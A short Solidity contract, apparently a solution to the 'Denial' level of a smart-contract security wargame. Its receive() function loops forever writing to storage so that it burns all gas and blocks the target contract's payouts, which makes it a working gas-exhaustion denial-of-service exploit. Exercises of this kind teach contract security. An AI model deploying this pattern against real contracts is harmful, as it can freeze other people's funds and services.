// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    uint256[] private numbers;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        // storage and exponential operation opcodes are very expensive
        while(true) {
            numbers.push(2 ** 255);
        }
    }
}
